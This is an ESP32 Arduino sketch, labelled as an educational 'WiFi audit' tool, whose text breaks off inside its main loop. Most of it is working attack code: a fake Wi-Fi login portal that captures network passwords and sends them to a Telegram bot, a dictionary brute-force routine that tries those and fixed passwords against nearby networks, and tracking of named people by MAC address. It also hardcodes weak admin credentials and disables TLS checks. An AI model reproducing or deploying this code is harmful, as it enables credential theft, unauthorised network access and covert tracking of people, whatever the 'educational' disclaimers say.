#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <vector>
#include <map>
#include <WiFiManager.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>

#define MAX_NETWORKS 50
#define MAX_AP_CLIENTS 16

enum ModoOperacao { AUDITORIA, EVIL_PORTAL };
ModoOperacao modoAtual = AUDITORIA;

const char* telegramBotToken = "";
const char* chat_id = "";
WiFiClientSecure secured_client;
UniversalTelegramBot bot(telegramBotToken, secured_client);

const char* dashboard_user = "admin";
const char* dashboard_pass = "admin123";

struct PessoaRef {
    const char* nome;
    const char* mac;
};
PessoaRef pessoas[] = {
    { "Paulo", "16:07:BD:C7:44:49" },
    { "João",  "81:11:AA:22:BB:33" },
    { "André", "C3:99:88:77:66:55" }
};
int pessoasN = sizeof(pessoas) / sizeof(pessoas[0]);

const char* wordlist[] = { "senha123", "123456", "senhaboa", "seNha#S3cReta", "adminwifi", "palavrachave" };
const int wordlistN = sizeof(wordlist) / sizeof(wordlist[0]);
std::vector<String> leakPasswords;

struct NetworkInfo {
    String ssid;
    int rssi;
    String bssid;
    int channel;
    String encryption;
};
NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
uint8_t ap_clients[MAX_AP_CLIENTS][6];
int ap_client_count = 0;
String lastScanCsv = "";
String lastClientsCsv = "";
unsigned long lastScanMillis = 0, lastClientMillis = 0;
WebServer server(80);

unsigned long PRESENCA_TIMEOUT_MS = 15000;
std::map<String, unsigned long> ultimaVezVisto;

// ---------- Funções utilitárias ----------
String macToStr(const uint8_t *mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}
String macUpper(String mac) { mac.toUpperCase(); return mac; }
String htmlEscape(String s) {
    s.replace("&", "&amp;"); s.replace("<", "&lt;"); s.replace(">", "&gt;");
    s.replace("\"", "&quot;"); s.replace("'", "&#39;");
    return s;
}
String padR(String s, int w) { while ((int)s.length() < w) s += " "; return s; }

// ---------- Envio Telegram (em blocos pequenos, 800 char) ----------
void enviarTelegramBlocos(String texto) {
    const size_t blockSize = 800;  // Segmento seguro (bem menor que limite do Telegram)
    size_t pos = 0;
    bool primeira = true;

    // Fallback: impede envio de bloco vazio
    if (texto.length() < 10) {
        Serial.println("[TELEGRAM] AVISO: Texto a enviar ao bot é muito curto ou vazio.");
        bool ok = bot.sendMessage(chat_id, "[ESP32] Relatório indisponível no momento.", "");
        Serial.print("[TELEGRAM] Msg fallback: ");
        Serial.println(ok ? "OK" : "FALHA");
        return;
    }

    while (pos < texto.length()) {
        String bloco = texto.substring(pos, pos + blockSize);
        String prefixo = "";
        if (primeira) {
            prefixo = "[ESP32] Relatório exportado!\n";
            primeira = false;
        }

        String mensagem = prefixo + bloco;

        bool ok = bot.sendMessage(chat_id, mensagem, "");
        Serial.println("---------------------------");
        Serial.print("[TELEGRAM] Enviando bloco de ");
        Serial.print(mensagem.length());
        Serial.println(" caracteres:");
        Serial.println(mensagem);
        Serial.print("[TELEGRAM] Status do envio: ");
        Serial.println(ok ? "OK" : "FALHA");
        Serial.println("---------------------------");

        if (!ok) {
            bot.sendMessage(chat_id, "[ESP32] Falha ao enviar parte do relatório.", "");
            Serial.println("[TELEGRAM] Fallback de falha enviado.");
            break;
        }

        delay(1100); // evita flood e problemas de throttle
        pos += blockSize;
    }
}

void enviarTelegram(String texto) {
    bot.sendMessage(chat_id, texto, "");
}

void scanNetworks() {
    int n = WiFi.scanNetworks();
    networkCount = 0;
    lastScanMillis = millis();
    lastScanCsv = "SSID,BSSID,CANAL,SEGURANCA,RSSI\n";
    for (int i = 0; i < n && networkCount < MAX_NETWORKS; ++i) {
        networks[networkCount].ssid = WiFi.SSID(i);
        networks[networkCount].rssi = WiFi.RSSI(i);
        networks[networkCount].bssid = WiFi.BSSIDstr(i);
        networks[networkCount].channel = WiFi.channel(i);
        wifi_auth_mode_t encType = WiFi.encryptionType(i);
        switch (encType) {
        case WIFI_AUTH_OPEN: networks[networkCount].encryption = "ABERTA"; break;
        case WIFI_AUTH_WEP: networks[networkCount].encryption = "WEP"; break;
        case WIFI_AUTH_WPA_PSK: networks[networkCount].encryption = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: networks[networkCount].encryption = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: networks[networkCount].encryption = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA2_ENTERPRISE: networks[networkCount].encryption = "WPA2 Ent"; break;
        case WIFI_AUTH_WPA3_PSK: networks[networkCount].encryption = "WPA3"; break;
        default: networks[networkCount].encryption = "DESCONHECIDA";
        }
        lastScanCsv += "\"" + networks[networkCount].ssid + "\"," + networks[networkCount].bssid + "," + String(networks[networkCount].channel) + "," + networks[networkCount].encryption + "," + String(networks[networkCount].rssi) + "\n";
        networkCount++;
    }
    WiFi.scanDelete();
    Serial.printf("[AUDITORIA] Scan: %d redes encontradas.\n", networkCount);
}

void scanAPClients() {
    wifi_sta_list_t stations;
    tcpip_adapter_sta_list_t adapter;
    static std::vector<String> clientes_antes; // Estado da varredura anterior

    int prev_count = ap_client_count;
    ap_client_count = 0;
    esp_wifi_ap_get_sta_list(&stations);
    tcpip_adapter_get_sta_list(&stations, &adapter);
    lastClientMillis = millis();
    lastClientsCsv = "MAC\n";
    for (int i = 0; i < adapter.num && i < MAX_AP_CLIENTS; i++) {
        uint8_t* mac = adapter.sta[i].mac;
        String macStr = macUpper(macToStr(mac));
        memcpy(ap_clients[ap_client_count], mac, 6);
        lastClientsCsv += macStr + "\n";
        ultimaVezVisto[macStr] = millis();
        ap_client_count++;
    }
    if (ap_client_count == 0) lastClientsCsv += "(Nenhum conectado)\n";
    Serial.printf("[AUDITORIA] %d clientes conectados ao AP.\n", ap_client_count);

    // ----- DETECTA CONECTADOS -----
    if (ap_client_count > prev_count) {
        enviarTelegram("[ESP32] Novo cliente conectado ao AP: " + macToStr(ap_clients[ap_client_count-1]));
    }

    // ----- DETECTA DESCONECTADOS ------
    // Cria lista atual dos clientes conectados (após varredura)
    std::vector<String> clientes_depois;
    for (int i = 0; i < ap_client_count; i++)
        clientes_depois.push_back(macUpper(macToStr(ap_clients[i])));

    // Procura MACs que estavam antes mas sumiram
    for (size_t i = 0; i < clientes_antes.size(); i++) {
        bool desconectou = true;
        for (size_t j = 0; j < clientes_depois.size(); j++) {
            if (clientes_depois[j] == clientes_antes[i]) {
                desconectou = false;
                break;
            }
        }
        if (desconectou) {
            enviarTelegram("[ESP32] Cliente desconectou do AP: " + clientes_antes[i]);
        }
    }

    // Atualiza para próxima rodada
    clientes_antes = clientes_depois;
}


struct SsidBssids { String ssid; std::vector<String> bssids; };
void getEvilTwinVetor(std::vector<SsidBssids>& ssid_map) {
    for (int i = 0; i < networkCount; i++) {
        bool found = false;
        for (unsigned j = 0; j < ssid_map.size(); j++) {
            if (ssid_map[j].ssid == networks[i].ssid) {
                ssid_map[j].bssids.push_back(networks[i].bssid);
                found = true; break;
            }
        }
        if (!found) {
            SsidBssids novo; novo.ssid = networks[i].ssid;
            novo.bssids.push_back(networks[i].bssid);
            ssid_map.push_back(novo);
        }
    }
}

void handleCsvScan() { 
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    server.send(200, "text/csv", lastScanCsv); 
}

void handleCsvClients() { 
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    server.send(200, "text/csv", lastClientsCsv); 
}

void handleTxtReport() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    
    scanNetworks();
    scanAPClients();

    String txt = "=== Auditoria WiFi ESP32 - Relatorio ===\n";
    txt += "Ultima varredura: " + String((millis() - lastScanMillis) / 1000) + "s atras\n";
    txt += "Redes encontradas: " + String(networkCount) + "\n";
    for (int i = 0; i < networkCount; i++)
        txt += String(i + 1) + ") " + padR(networks[i].ssid, 20) + " " + networks[i].bssid +
        " Ch:" + String(networks[i].channel) +
        " RSSI:" + String(networks[i].rssi) + " " + networks[i].encryption + "\n";
    txt += "\nClientes conectados ao AP do ESP32:\n";
    for (int i = 0; i < ap_client_count; i++) txt += macToStr(ap_clients[i]) + "\n";
    txt += "\nDispositivos relevantes:\n";
    unsigned long agora = millis();
    for (int i = 0; i < pessoasN; i++) {
        String mac = macUpper(String(pessoas[i].mac));
        bool presente = false;
        if (ultimaVezVisto.find(mac) != ultimaVezVisto.end() && (agora - ultimaVezVisto[mac]) < PRESENCA_TIMEOUT_MS) presente = true;
        txt += String(pessoas[i].nome) + ": " + pessoas[i].mac + " (" + (presente ? "presente" : "ausente") + ")\n";
    }
    txt += "\n=== FIM ===\n";

    enviarTelegramBlocos(txt);
    server.send(200, "text/plain", txt);
}

void handlePortalFalso() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    String html = "<!DOCTYPE html><html lang='pt-br'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Portal Wi-Fi Simulado</title>"
    "<style>body{margin:0;background:#eef3fb;font-family:'Segoe UI',Arial,sans-serif;}"
    ".container{max-width:370px;margin:50px auto;background:#fff;border-radius:16px;box-shadow:0 2px 16px #aac2dd42;padding:25px;}"
    ".logo{margin:0 auto 16px;width:84px;height:84px;background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Wifi_Logo.svg/240px-Wifi_Logo.svg.png')center/cover no-repeat;border-radius:100px;box-shadow:0 2px 8px #218c304b;}"
    "h2{text-align:center;color:#234288;margin-bottom:22px;font-size:1.13em;letter-spacing:.03em;}"
    "label{font-size:1em;color:#333;margin:8px 0 4px 0;display:block;}"
    "select,input[type=password]{display:block;width:100%;padding:11px;margin:8px 0 13px 0;font-size:1.05em;border-radius:8px;border:1px solid #b4d5e2;background:#f6faff;transition:border .2s;}"
    "select:focus,input[type=password]:focus{border:1.5px solid #2577b8;outline:none;}"
    ".btn{background:#2577b8;color:#fff;border:none;border-radius:8px;padding:13px 0;width:100%;font-size:1.1em;font-weight:600;cursor:pointer;box-shadow:0 1px 6px #abc6ea33;margin-top:7px;transition:background .17s;}"
    ".btn:hover{background:#195399;}"
    ".menubtn{background:#218c30;color:#fff;font-weight:600;text-decoration:none;border-radius:8px;padding:7px 19px;box-shadow:0 1px 2px #bbb;display:inline-block;margin-bottom:10px;margin-right:8px;text-align:center;}"
    ".footer{margin:16px 0 1px;color:#6a859b;font-size:13px;text-align:center;}</style></head><body>"
    "<div class='container'><div class='logo'></div>"
    "<h2>Rede Wi-Fi<br>Autenticação</h2>"
    "<div style='text-align:center;margin-bottom:14px;'>"
    "<a href='/auditoria' class='menubtn'>Ir para Auditoria</a>"
    "</div>"
    "<form method='POST' action='/captura_wifi'>"
    "<label for='ssid'>Escolha a rede Wi-Fi</label><select id='ssid' name='ssid' required>";
    for(int i=0; i<networkCount; i++) {
        html += "<option value='" + htmlEscape(networks[i].ssid) + "'>";
        html += htmlEscape(networks[i].ssid) + "</option>";
    }
    html += "</select><label for='senha'>Senha da rede Wi-Fi</label>"
    "<input type='password' id='senha' name='senha' autocomplete='current-password' required>"
    "<button type='submit' class='btn'>Entrar</button></form>"
    "<div class='footer'>© 2025 Portal Wi-Fi Simulado</div>"
    "</div></body></html>";
    server.send(200, "text/html", html);
}

void handleCapturaWifi() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    String ssid = server.arg("ssid");
    String senha = server.arg("senha");
    senha.trim();
    Serial.printf("[PORTAL FAKE] SSID = %s | SENHA = '%s'\n", ssid.c_str(), senha.c_str());
    bool found = false;
    for (const auto& pw : leakPasswords) {
        if (pw == senha) found = true;
    }
    if (!found && senha.length() > 0) leakPasswords.push_back(senha);

    // Sempre envia para o Telegram ao submeter (independe de conexão anterior)
    if (WiFi.status() == WL_CONNECTED) {
        enviarTelegram("[ESP32] Senha TENTADA no Portal Fake!\nSSID: " + ssid + "\nSenha: " + senha);
    }

    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width'>"
     "<style>body{font-family:sans-serif;text-align:center;margin-top:60px;} .ok{background:#d0fae2;border-radius:8px;display:inline-block;padding:22px 25px;margin:10px auto;font-size:1.15em;color:#158d49;} .menubtn{background:#218c30;color:#fff;font-weight:600;text-decoration:none;border-radius:8px;padding:7px 19px;box-shadow:0 1px 2px #bbb;display:inline-block;margin-top:16px;}</style></head><body>"
     "<div class='ok'><b>Conexão efetuada!</b><br>Você já pode navegar.</div>"
     "<a href='/auditoria' class='menubtn'>Ir para Auditoria</a>"
     "</body></html>";
    server.send(200, "text/html", html);
}


void handleBruteForce() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    String html =
    "<!DOCTYPE html><html lang='pt-br'><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Teste Force Bruto (Educativo)</title>"
    "<style>"
    "body{margin:0;background:#f2f6ff;font-family:'Segoe UI',Arial,sans-serif;}"
    ".header{background:#274584;padding:20px;color:#fff;text-align:center;font-size:1.22em;font-weight:600;letter-spacing:.02em;}"
    ".main{max-width:400px;background:#fff;margin:35px auto 24px;border-radius:13px;box-shadow:0 2px 16px #a0bed64a;padding:28px;}"
    "h2{color:#215;margin-bottom:18px;font-size:1.13em;letter-spacing:.01em;text-align:center;}"
    "label{font-size:1em;color:#234;margin-top:11px;display:block;}"
    "select,input[type=text]{display:block;width:100%;padding:11px;margin:10px 0 12px 0;font-size:1.05em;border-radius:8px;border:1px solid #b4d5e2;background:#f6faff;transition:border .2s;}"
    "select:focus,input:focus{border:1.5px solid #2577b8;outline:none;}"
    ".btn{background:#2577b8;color:#fff;border:none;border-radius:8px;padding:13px 0;width:100%;font-size:1.1em;font-weight:600;cursor:pointer;box-shadow:0 1px 6px #abc6ea33;margin-bottom:11px;transition:background .17s;}"
    ".btn:hover{background:#195399;}"
    ".pwlist{margin:12px 0 0 0;}"
    ".pwtoken{background:#e4f8ed;color:#136d28;border-radius:8px;padding:2px 10px;margin:2px 4px;font-size:97%;display:inline-block;}"
    ".pwtokenfixed{background:#e0e3fc;color:#2738a8;border-radius:8px;padding:2px 10px;margin:2px 4px;font-size:97%;display:inline-block;}"
    ".result{margin-top:18px;margin-bottom:5px;font-size:1.09em;text-align:left;line-height:1.7;}"
    ".success{background:#d0fae2;border-radius:8px;display:inline-block;padding:12px 22px;margin:4px 0;color:#158d49;font-weight:bold;}"
    ".fail{background:#feeaea;border-radius:8px;display:inline-block;padding:12px 22px;margin:4px 0;color:#a51224;font-weight:bold;}"
    ".footer{margin:29px 0 6px;color:#718090;font-size:13px;text-align:center;}"
    ".menubtn{background:#2577b8;color:#fff;font-weight:600;text-decoration:none;border-radius:8px;padding:7px 17px;box-shadow:0 1px 2px #bbb;display:inline-block;margin-top:12px;}"
    "</style></head><body>"
    "<div class='header'>Brute Force Educativo</div>"
    "<div class='main'>"
    "<h2>Teste de Dicionário<br>(Simulação Didática)</h2>";

    if (!server.hasArg("ssid")) {
        html += "<form method='GET'>";
        html += "<label for='ssid'>Escolha a rede Wi-Fi encontrada</label><select name='ssid' id='ssid'>";
        for (int i = 0; i < networkCount; i++)
            html += "<option value='" + htmlEscape(networks[i].ssid) + "'>" + htmlEscape(networks[i].ssid) + "</option>";
        html += "</select>";
        html += "<button type='submit' class='btn'>Iniciar Teste</button></form>";
        html += "<div class='pwlist'><b>Dicionário usado:</b><br>";
        for (int i = 0; i < wordlistN; i++)
            html += "<span class='pwtokenfixed'>" + String(wordlist[i]) + "</span> ";
        for (const auto& pw : leakPasswords)
            html += "<span class='pwtoken'>" + pw + "</span> ";
        html += "</div>";
        html += "<div style='text-align:center;'><a href='/' class='menubtn'>Voltar ao Dashboard</a></div>";
        html += "<div class='footer'>Realize testes educativos de força bruta e veja como é arriscado usar senhas previsíveis.</div>";
        html += "</div></body></html>";
        server.send(200, "text/html", html);
        return;
    }

    String ssid = server.arg("ssid");
    html += "<div class='result'><b>Brute-force na rede:</b> <span style='color:#2577b8'>" + htmlEscape(ssid) + "</span><br>";
    bool found = false; int tries = 0;

    for (int i = 0; i < wordlistN; i++) {
        tries++;
        html += "Tentando senha <span class='pwtokenfixed'>" + String(wordlist[i]) + "</span>... ";
        WiFi.begin(ssid.c_str(), wordlist[i]);
        unsigned long t0 = millis();
        int waitms = 0;
        while (WiFi.status() != WL_CONNECTED && waitms < 4000) { delay(160); waitms+=160; }
        if (WiFi.status() == WL_CONNECTED) {
            html += "<span class='success'>SUCESSO!</span><br>";
            found = true;
            Serial.printf("[BRUTEFORCE] SSID=%s Senha=%s (SUCESSO)\n", ssid.c_str(), wordlist[i]);
            // *** ENVIO TELEGRAM ***
            if (WiFi.status() == WL_CONNECTED) {
                enviarTelegram("[ESP32] Senha descoberta no brute force!\nSSID: " + ssid + "\nSenha: " + String(wordlist[i]));
            }
            WiFi.disconnect();
            break;
        } else {
            html += "<span class='fail'>Falhou.</span><br>";
            WiFi.disconnect();
        }
    }

    if (!found) {
        for (const auto& pw : leakPasswords) {
            tries++;
            String pwSanitized = pw; pwSanitized.trim();
            html += "Tentando senha <span class='pwtoken'>" + pwSanitized + "</span>... ";
            WiFi.begin(ssid.c_str(), pwSanitized.c_str());
            unsigned long t0 = millis();
            int waitms = 0;
            while (WiFi.status() != WL_CONNECTED && waitms < 4000) { delay(160); waitms+=160; }
            if (WiFi.status() == WL_CONNECTED) {
                html += "<span class='success'>SUCESSO!</span> Senha: <b>" + pwSanitized + "</b><br>";
                found = true;
                Serial.printf("[BRUTEFORCE] SSID=%s Senha=%s (SUCESSO - coleta)\n", ssid.c_str(), pwSanitized.c_str());
                // *** ENVIO TELEGRAM ***
                if (WiFi.status() == WL_CONNECTED) {
                    enviarTelegram("[ESP32] Senha do leak encontrada via brute force!\nSSID: " + ssid + "\nSenha: " + pwSanitized);
                }
                WiFi.disconnect();
                break;
            } else {
                html += "<span class='fail'>Falhou.</span><br>";
                WiFi.disconnect();
            }
        }
    }

    if (found)
        html += "<div class='success'>Senha descoberta após " + String(tries) + " tentativas.</div>";
    else
        html += "<div class='fail'>Nenhuma senha do dicionário (fixo ou coletado) funcionou.</div>";
    html += "<br><a href='/bruteforce' class='menubtn'>Testar Outra Rede</a>";
    html += "<a href='/' class='menubtn'>Voltar ao Dashboard</a></div>";
    html += "<div class='footer'>Use este teste apenas para fins educativos — não realize ataques reais em redes sem permissão.</div></div></body></html>";
    server.send(200, "text/html", html);
}

void handleDataJson() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    int n_aberta = 0, n_wep = 0, n_wpa = 0, n_wpa2 = 0, n_wpae = 0, n_wpa3 = 0, n_unk = 0;
    for (int i = 0; i < networkCount; i++) {
        if (networks[i].encryption == "ABERTA") n_aberta++;
        else if (networks[i].encryption == "WEP") n_wep++;
        else if (networks[i].encryption == "WPA") n_wpa++;
        else if (networks[i].encryption == "WPA2") n_wpa2++;
        else if (networks[i].encryption.indexOf("WPA2 Ent") >= 0) n_wpae++;
        else if (networks[i].encryption == "WPA3") n_wpa3++;
        else n_unk++;
    }
    String json = "{\"redes\":[";
    for (int i = 0; i < networkCount; i++) {
        if (i > 0) json += ",";
        json += "{\"ssid\":\"" + htmlEscape(networks[i].ssid) + "\",\"bssid\":\"" + networks[i].bssid + "\",\"canal\":" + String(networks[i].channel) + ",\"enc\":\"" + networks[i].encryption + "\",\"rssi\":" + String(networks[i].rssi) + "}";
    }
    json += "],\"clientes\":[";
    for (int i = 0; i < ap_client_count; i++) {
        if (i > 0) json += ",";
        json += "\"" + macToStr(ap_clients[i]) + "\"";
    }
    json += "],\"pessoas\":[";
    unsigned long agora = millis();
    for (int i = 0; i < pessoasN; i++) {
        if (i > 0) json += ",";
        String mac = macUpper(String(pessoas[i].mac));
        bool presente = false;
        if (ultimaVezVisto.find(mac) != ultimaVezVisto.end() && (agora - ultimaVezVisto[mac]) < PRESENCA_TIMEOUT_MS) {
            presente = true;
        }
        json += "{\"nome\":\"" + String(pessoas[i].nome) + "\",\"mac\":\"" + pessoas[i].mac + "\",\"presente\":" + (presente ? "true" : "false") + "}";
    }
    json += "],\"wordlist\":[";
    for (unsigned int i = 0; i < leakPasswords.size(); i++) {
        if (i > 0) json += ",";
        json += "\"" + leakPasswords[i] + "\"";
    }
    json += "]";
    json += "}";
    server.send(200, "application/json", json);
}

void handleRoot() {
    if (!server.authenticate(dashboard_user, dashboard_pass))
        return server.requestAuthentication();
    if (modoAtual == EVIL_PORTAL) {
        handlePortalFalso();
        return;
    }
    std::vector<SsidBssids> ssid_map;
    getEvilTwinVetor(ssid_map);
    std::vector<NetworkInfo> rank;
    for (int i = 0; i < networkCount; i++) rank.push_back(networks[i]);
    std::sort(rank.begin(), rank.end(), [](const NetworkInfo& a, const NetworkInfo& b) {return a.rssi > b.rssi;});
    if ((int)rank.size() > 5) rank.resize(5);

    String html =
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<title>Auditoria WiFi ESP32</title>"
        "<style>"
        "body{margin:0;font-family:'Segoe UI',Arial,sans-serif;background:#f2f6ff;}"
        ".header{background:#274584;padding:20px;color:#fff;text-align:center;font-size:1.34em;font-weight:bold;letter-spacing:.04em;}"
        ".menu{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;background:#e9eef9;padding:10px 0 3px 0;}"
        ".btn{display:inline-block;padding:9px 20px;background:#2577b8;color:#fff;font-weight:600;border-radius:8px;font-size:1.07em;text-decoration:none;margin:2px 3px 7px 3px;box-shadow:0 1px 3px #bbb;transition:.2s;}"
        ".btn:hover{background:#153b67;}"
        ".main{max-width:730px;background:#fff;margin:24px auto 24px;border-radius:14px;box-shadow:0 3px 14px #7faaf729;padding:24px;}"
        "h2{color:#225;margin-top:18px;font-size:1.15em;letter-spacing:.01em;border-bottom:1px solid #e5e6ed;padding-bottom:3px;}"
        ".section{margin-bottom:18px;}"
        ".alert{border:2px solid #a21;padding:11px 20px;border-radius:8px;margin:20px 0 14px 0;background:#ffe9e9;font-weight:bold;color:#a21;text-align:left;}"
        "table{width:100%;border-collapse:collapse;margin-top:2px;}"
        "th,td{padding:7px 8px;text-align:left;}"
        "th{background:#f3f5fb;color:#294;}tr:nth-child(odd){background:#f8fbfd;}"
        "tr:hover{background:#e3e9f2;}"
        ".tag{display:inline-block;padding:0 8px;border-radius:8px;font-size:90%;font-weight:500;}"
        ".tag.aberta{background:#ffeaea;color:#c22;}"
        ".tag.wpa2{background:#daeefa;color:#2155c2;}"
        ".tag.wpa3{background:#d8efe3;color:#0c864d;}"
        ".tag.other{background:#eee;color:#888;}"
        ".presente{color:#218c30;font-weight:600;}.ausente{color:#c22;font-weight:600;}"
        ".rbar{display:inline-block;height:11px;border-radius:6px;background:#d1e8de;margin-right:6px;vertical-align:middle;}"
        ".footer{color:#888;text-align:center;margin: 28px 0 2px 0;font-size:13px;}"
        "@media(max-width:650px){.main{padding:8px;}.header{font-size:1em;}.btn{padding:7px 8px;font-size:1em;}}"
        "</style>"
        "<script>"
        "function fetchAll(){"
        "fetch('/data').then(r=>r.json()).then(data=>{"
        "let tbody='';"
        "for(let i=0;i<data.redes.length;i++){"
        "let rede=data.redes[i],c='';"
        "let tag = (rede.enc=='ABERTA')?'<span class=\"tag aberta\">Aberta</span>':"
        "(rede.enc=='WEP')?'<span class=\"tag aberta\">WEP</span>':"
        "(rede.enc=='WPA2')?'<span class=\"tag wpa2\">WPA2</span>':"
        "(rede.enc=='WPA3')?'<span class=\"tag wpa3\">WPA3</span>':'<span class=\"tag other\">'+rede.enc+'</span>';"
        "let cor = (rede.rssi > -40)?'#38c321':(rede.rssi>-60)?'#f2c322':(rede.rssi > -80)?'#fa8500':'#ea3f3f';"
        "c=`<tr><td>${i+1}</td><td>${rede.ssid}</td><td>${rede.bssid}</td><td style='text-align:center'>${rede.canal}</td><td>${tag}</td>`+"
        "`<td style='text-align:right'>${rede.rssi} dBm <span class='rbar' style='width:${125 + rede.rssi}px;background:${cor}'></span></td></tr>`;"
        "tbody+=c;"
        "}"
        "document.getElementById('tbodyredes').innerHTML=tbody;"
        "let tcli='';for(let i=0;i<data.clientes.length;i++)tcli+=`<tr><td>${i+1}</td><td>${data.clientes[i]}</td></tr>`;"
        "document.getElementById('tbodycli').innerHTML=data.clientes.length?tcli:`<tr><td colspan=2>Nenhum conectado</td></tr>`;"
        "let ppl='';for(let i=0;i<data.pessoas.length;i++){let p=data.pessoas[i];"
        "ppl+=`<tr><td>${p.nome}</td><td>${p.mac}</td><td class='${p.presente?'presente':'ausente'}'>${p.presente?'Presente':'Ausente'}</td></tr>`;}"
        "document.getElementById('tbodypeople').innerHTML=ppl;"
        "let pwlist='';for(let i=0;i<data.wordlist.length;i++){pwlist+=`<span style='background:#f2f8e0;color:#227b13;border-radius:8px;padding:2px 11px;margin:2px;font-size:97%;display:inline-block;'>${data.wordlist[i]}</span> `;}document.getElementById('pwlist').innerHTML=pwlist;"
        "});"
        "}"
        "window.onload=function(){fetchAll();setInterval(fetchAll,3500);}"
        "</script>"
        "</head><body>"
        "<div class='header'>Central de Auditoria WiFi ESP32</div>"
        "<div class='menu'>"
        "<a href='/' class='btn'>Dashboard</a>"
        "<a href='/relatorio' class='btn'>Exportar TXT</a>"
        "<a href='/csvscan' class='btn'>CSV redes</a>"
        "<a href='/csvclients' class='btn'>CSV clientes</a>"
        "<a href='/bruteforce' class='btn'>Brute Force</a>"
        "<a href='/evil' class='btn' style='background:#db3a2f'>Modo Portal Falso</a>"
        "</div>"
        "<div class='main'>"
        "<div style='margin-bottom:17px;font-size:93%;color:#294;'>"
        "Última varredura: " + String((millis()-lastScanMillis)/1000) + "s atrás"
        "</div>";

    int evilCount = 0;
    for (size_t i = 0; i < ssid_map.size(); i++) if (ssid_map[i].bssids.size() > 1) evilCount++;
    for (unsigned k = 0; k < ssid_map.size(); k++) {
        if (ssid_map[k].bssids.size() > 1) {
            html += "<div class='alert'><b>Atenção:</b> SSID <b>" + htmlEscape(ssid_map[k].ssid) +
                "</b> aparece em mais de um BSSID!<br>BSSIDs: ";
            for (unsigned m = 0; m < ssid_map[k].bssids.size(); m++) {
                if (m > 0) html += " | ";
                html += htmlEscape(ssid_map[k].bssids[m]);
            }
            html += "</div>";
        }
    }

    html += "<div class='section'><h2>Ranking de Sinais (Top 5)</h2>"
        "<table><tr><th>#</th><th>SSID</th><th>Canal</th><th>Força (dBm)</th></tr>";
    for (unsigned int i = 0; i < rank.size(); i++) {
        html += "<tr><td>" + String(i + 1) + "</td><td>" + htmlEscape(rank[i].ssid) +
            "</td><td>" + String(rank[i].channel) +
            "</td><td>" + String(rank[i].rssi) + "</td></tr>";
    }
    html += "</table></div>"
        "<div class='section'><h2>Redes WiFi Encontradas</h2>"
        "<table><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Canal</th><th>Segurança</th><th>RSSI</th></tr>"
        "<tbody id=\"tbodyredes\"></tbody></table></div>"
        "<div class='section'><h2>Clientes conectados ao AP ESP32</h2>"
        "<table><tr><th>#</th><th>MAC</th></tr><tbody id='tbodycli'></tbody></table></div>"
        "<div class='section'><h2>Dispositivos do grupo (presença)</h2>"
        "<table><tr><th>Nome</th><th>MAC</th><th>Status</th></tr><tbody id='tbodypeople'></tbody></table></div>"
        "<div class='section'><h2>Senhas coletadas no Portal Falso</h2>"
        "<div id='pwlist' style='padding:8px 0'></div></div>"
        "<div class='footer'>ESP32 Central Auditoria WiFi &copy; 2025 — Ensino, Pesquisa e Automação<br>Use: <b>http://192.168.4.1/</b></div></body></html>";

    server.send(200, "text/html", html);
}

// ---- WiFiManager callback (opcional) ----
bool shouldSaveConfig = false;
void saveConfigCallback() {
    shouldSaveConfig = true;
    Serial.println("Configuração salva pelo WiFiManager.");
}

void setup() {
    Serial.begin(115200); Serial.println("=== Auditoria WiFi ESP32 ===");
    secured_client.setInsecure();

    WiFiManager wifiManager;
    //wifiManager.resetSettings();
    wifiManager.setSaveConfigCallback(saveConfigCallback);

    if (!wifiManager.autoConnect("Auditoria_Grupo_AJP")) {
        Serial.println("Falha ao conectar e tempo limite atingido.");
        delay(3000);
        ESP.restart();
    }
    Serial.print("IP (STA): "); Serial.println(WiFi.localIP());

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("Auditoria_Grupo_AJP", "");
    Serial.println("Acesse pelo AP (WiFi ESP32): http://192.168.4.1/");
    scanNetworks(); scanAPClients();

    server.on("/evil", [](){ modoAtual = EVIL_PORTAL; server.sendHeader("Location","/",true); server.send(302,"",""); });
    server.on("/auditoria", [](){ modoAtual = AUDITORIA; server.sendHeader("Location","/",true); server.send(302,"",""); });
    server.on("/captura_wifi", HTTP_POST, handleCapturaWifi);
    server.on("/", handleRoot);
    server.on("/csvscan", handleCsvScan);
    server.on("/csvclients", handleCsvClients);
    server.on("/relatorio", handleTxtReport); // já envia automatico ao acessar!
    server.on("/bruteforce", handleBruteForce);
    server.on("/data", handleDataJson);
    server.on("/reset_config", []() {
        // Exige autenticação usando as mesmas credenciais do painel admin
        if (!server.authenticate(dashboard_user, dashboard_pass))
            return server.requestAuthentication();
        WiFiManager wifiManager;
        wifiManager.resetSettings();  // Limpa configuração WiFi/NVS
        server.send(200, "text/plain", "Configuração de Wi-Fi resetada. O ESP vai reiniciar.");
        delay(900);                   // Dá tempo de responder antes de reiniciar
        ESP.restart();                // Reinicia o dispositivo
    });

    server.begin();
}

void loop() {
    server.handleClient();
    static unsigned long last = 0, last2 = 0;
